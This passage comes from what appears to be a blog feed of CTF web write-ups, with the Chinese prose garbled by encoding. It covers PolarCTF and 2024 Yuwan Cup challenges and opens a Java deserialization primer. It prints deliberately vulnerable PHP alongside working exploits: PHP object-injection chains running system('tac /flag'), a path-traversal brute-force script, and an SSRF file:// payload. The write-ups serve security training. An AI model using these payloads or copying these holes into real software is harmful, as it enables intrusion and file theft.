class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fl\ag<span class="token operator">.</span>php</code></pre><h4 id="bllbl-ser1"><a href="#bllbl-ser1" class="headerlink" title="bllbl_ser1"></a>bllbl_ser1</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllbl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$qiang</span><span class="token punctuation">;</span><span class="token comment">//æˆ‘çš„å¼º</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">bllliang</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">bllliang</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">qiang</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllnbnl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$er</span><span class="token punctuation">;</span><span class="token comment">//æˆ‘çš„å„¿</span>    <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">er</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'blljl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$user_data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'blljl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllbl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$qiang</span><span class="token punctuation">;</span><span class="token comment">//æˆ‘çš„å¼º</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">bllnbnl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$er</span><span class="token punctuation">;</span><span class="token comment">//æˆ‘çš„å„¿</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bllbl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qiang</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bllnbnl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">qiang</span><span class="token operator">-></span><span class="token property">er</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-http" data-language="http"><code class="language-http">?blljl=O:5:"bllbl":1:&#123;s:5:"qiang";O:7:"bllnbnl":1:&#123;s:2:"er";s:20:"system('tac /flag');";&#125;&#125;</code></pre><h4 id="1ncIud3"><a href="#1ncIud3" class="headerlink" title="1ncIud3"></a>1ncIud3</h4><p>?page&#x3D;flagå¯¹åº”äº†.&#x2F;flag.phpï¼Œæ–‡ä»¶åç¼€å†™æ­»äº†æ˜¯php</p><p>ç»è¿‡æµ‹è¯•å‘ç°é¢˜ç›®ä¼šå°†..&#x2F;æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡å¯ä»¥ç›®å½•ç©¿è¶Š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> itertools <span class="token keyword">import</span> product<span class="token keyword">import</span> time<span class="token comment"># å®šä¹‰å­—ç¬¦æ›¿æ¢è§„åˆ™</span>replace_list <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'f'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'l'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'g'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token comment"># ç›®æ ‡å­—ç¬¦ä¸²</span>target <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token comment"># ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„ç»„åˆ</span><span class="token keyword">def</span> <span class="token function">generate_combinations</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> replace_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å°†ç›®æ ‡å­—ç¬¦ä¸²æ‹†åˆ†æˆå­—ç¬¦åˆ—è¡¨</span>    chars <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>        <span class="token comment"># ç”Ÿæˆæ¯ä¸ªå­—ç¬¦çš„æ‰€æœ‰å¯èƒ½æ›¿æ¢</span>    replacements <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> replace_list<span class="token punctuation">:</span>            replacements<span class="token punctuation">.</span>append<span class="token punctuation">(</span>replace_list<span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            replacements<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>char<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># ä½¿ç”¨ itertools.product ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„ç»„åˆ</span>    combinations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>combination<span class="token punctuation">)</span> <span class="token keyword">for</span> combination <span class="token keyword">in</span> product<span class="token punctuation">(</span><span class="token operator">*</span>replacements<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> combinations<span class="token comment"># ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„ç»„åˆ</span>combinations <span class="token operator">=</span> generate_combinations<span class="token punctuation">(</span>target<span class="token punctuation">,</span> replace_list<span class="token punctuation">)</span><span class="token comment"># ç›®æ ‡ URL</span>url <span class="token operator">=</span> <span class="token string">"http://2e60dd05-b51e-49bf-9e32-2fef866f4105.www.polarctf.com:8090/"</span>  <span class="token comment"># æ›¿æ¢ä¸ºå®é™…çš„ API URL</span><span class="token comment"># å‘é€è¯·æ±‚</span><span class="token keyword">for</span> combination <span class="token keyword">in</span> combinations<span class="token punctuation">:</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"page"</span><span class="token punctuation">:</span> <span class="token string">"..././..././"</span><span class="token operator">+</span>combination<span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token comment"># æ‰“å°å“åº”</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Sent: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>combination<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># å¦‚æœå“åº”ä¸­åŒ…å«ç‰¹å®šçš„å†…å®¹ï¼Œå¯ä»¥åœæ­¢å‘é€è¯·æ±‚</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found special response with combination: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>combination<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p>ps: å¾ˆä¸è§£çš„ä¸€é“é¢˜</p><h4 id="æŠ•å–‚"><a href="#æŠ•å–‚" class="headerlink" title="æŠ•å–‚"></a>æŠ•å–‚</h4><pre class="language-markup" data-language="markup"><code class="language-markup">Welcome to the CTF Challenge!Use the following API to interact:POST a parameter "data" containing serialized User objectHint: You might want to understand how PHP serialization works. Try to serialize a User object with the username and is_admin properties.Extra Hint: If you can make the server think you are an admin (is_admin=true), you might get something special.</code></pre><p>æ ¹æ®é¢˜æ„å³å¯</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$is_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">is_admin</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PolarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024å¾¡å®›æ¯-web</title>
      <link href="/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/"/>
      <url>/2024/09/15/2024%E5%BE%A1%E5%AE%9B%E6%9D%AF-web/</url>
      
        <content type="html"><![CDATA[<h4 id="æ¥ç­¾ä¸ªåˆ°å§"><a href="#æ¥ç­¾ä¸ªåˆ°å§" class="headerlink" title="æ¥ç­¾ä¸ªåˆ°å§~~"></a>æ¥ç­¾ä¸ªåˆ°å§~~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\107\132\103\124\106\137\106\114\101\107"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> lklsgyy<span class="token punctuation">:</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"\x69\x64"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\150\x65\156\141\156"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">goto</span> lklsgyy<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></code></pre><ul><li><code>\x69\x64</code> æ˜¯ä¸€ä¸ªåå…­è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <code>&quot;id&quot;</code>ã€‚</li><li><code>\150\x65\156\141\156</code> æ˜¯ä¸€ä¸ªå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸² <code>&quot;henan&quot;</code>ã€‚</li><li><code>base64_encode(&quot;\150\x65\156\141\156&quot;)</code> å°†å­—ç¬¦ä¸² <code>&quot;henan&quot;</code> ç¼–ç ä¸ºbase64ã€‚</li></ul><p>ä»£ç æ£€æŸ¥ <code>$_REQUEST</code> æ•°ç»„ä¸­çš„ <code>id</code> å‚æ•°ï¼ˆåŒ…æ‹¬ <code>$_GET</code> å’Œ <code>$_POST</code> æ•°æ®ï¼‰æ˜¯å¦ç­‰äº <code>&quot;henan&quot;</code> çš„base64ç¼–ç å€¼ã€‚</p><ul><li><code>&quot;henan&quot;</code> çš„base64ç¼–ç å€¼æ˜¯ <code>&quot;aGVuYW4=&quot;</code>ã€‚</li></ul><p>å¦‚æœ <code>id</code> å‚æ•°ä¸ç­‰äº <code>&quot;aGVuYW4=&quot;</code>ï¼Œä»£ç ä¼šè·³è½¬åˆ°æ ‡ç­¾ <code>lklsgyy</code>ã€‚</p><h4 id="è®°å¾—åŒ¿åå“Ÿ"><a href="#è®°å¾—åŒ¿åå“Ÿ" class="headerlink" title="è®°å¾—åŒ¿åå“Ÿ~"></a>è®°å¾—åŒ¿åå“Ÿ~</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">class</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è¿™è¡Œä»£ç é”€æ¯äº†å˜é‡ $aï¼Œå› æ­¤ä¹‹å‰åˆ›å»ºçš„åŒ¿åç±»å®ä¾‹ä¸å†å¯ç”¨ã€‚</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="æœç´¢ä¸€ä¸‹"><a href="#æœç´¢ä¸€ä¸‹" class="headerlink" title="æœç´¢ä¸€ä¸‹"></a>æœç´¢ä¸€ä¸‹</h4><p>SSRFä½¿ç”¨fileåè®®å³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">geturl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;b>flagåœ¨/flag.txt&lt;/b>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">geturl</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"    &lt;!DOCTYPE html>    &lt;html>    &lt;head>    &lt;meta charset='UTF-8'>&lt;/head>&lt;body>&lt;form method='post'>&lt;input type='text' name='url' placeholder='è¾“å…¥ç½‘å€'>&lt;input type='submit' name='submit' placeholder='æäº¤'>&lt;/form>&lt;/body>    &lt;/html>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>url<span class="token operator">=</span>file<span class="token punctuation">:</span><span class="token comment">///flag.txt</span></code></pre><h4 id="ä½ çŸ¥é“SESSIONå—-sessionååºåˆ—åŒ–é€ƒé€¸"><a href="#ä½ çŸ¥é“SESSIONå—-sessionååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ä½ çŸ¥é“SESSIONå—(sessionååºåˆ—åŒ–é€ƒé€¸)"></a>ä½ çŸ¥é“SESSIONå—(sessionååºåˆ—åŒ–é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloEva</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome To Eva Word~"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloEva</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># Look Look session.php?</span><span class="token delimiter important">?></span></span></code></pre><p>session.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>ï¼šè®¾ç½®ä¼šè¯åºåˆ—åŒ–å¤„ç†å™¨ä¸ºâ€™php_serializeâ€™ï¼Œè¿™æ„å‘³ç€ä¼šè¯æ•°æ®å°†ä½¿ç”¨PHPçš„åºåˆ—åŒ–æœºåˆ¶è¿›è¡Œå­˜å‚¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¾¡å®›æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAå®‰å…¨åŸºç¡€-- åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</title>
      <link href="/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/"/>
      <url>/2024/09/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h3><ul><li>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ</li><li>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å…³é”®å‡½æ•°ï¼Ÿ</li><li>ååºåˆ—åŒ–è¿‡åçš„æ•°æ®æœ‰å•¥ç‰¹å¾?</li><li>javaååºåˆ—åŒ–æ¼æ´ä¸phpååºåˆ—åŒ–æ¼æ´çš„ç›¸ä¼¼ä¹‹å¤„?</li></ul><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">Java-åºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p><p><a href="https://www.javasec.org/javase/JavaDeserialization/Serialization.html">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></p><p>å…¶å®javaååºåˆ—åŒ–æ¼æ´çš„åŸç†å¾ˆç®€å•ï¼Œåªæ˜¯å„ä¸ªPOPé“¾æ¯”è¾ƒå¤æ‚ã€‚</p><h3 id="0x02-æ¦‚å¿µ"><a href="#0x02-æ¦‚å¿µ" class="headerlink" title="0x02 æ¦‚å¿µ"></a>0x02 æ¦‚å¿µ</h3><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œè¿œç¨‹é€šä¿¡æ—¶ï¼Œå¯ä»¥ç›¸äº’å‘é€å„ç§ç±»å‹çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œ è€Œè¿™äº›æ•°æ®éƒ½ä¼šä»¥äºŒè¿›åˆ¶åºåˆ—çš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ é€ã€‚é‚£ä¹ˆå½“ä¸¤ä¸ªJavaè¿›ç¨‹è¿›è¡Œé€šä¿¡æ—¶ï¼Œèƒ½å¦å®ç°è¿›ç¨‹é—´çš„å¯¹è±¡ä¼ é€å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ã€‚å¦‚ä½•åšåˆ°å‘¢ï¼Ÿè¿™å°±éœ€è¦Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†ã€‚æ¢å¥è¯è¯´ï¼Œä¸€æ–¹é¢ï¼Œå‘é€æ–¹éœ€è¦æŠŠè¿™ä¸ªJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œç„¶ååœ¨ç½‘ç»œä¸Šä¼ é€ï¼›å¦ä¸€æ–¹é¢ï¼Œæ¥æ”¶æ–¹éœ€è¦ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡ã€‚</p><p> 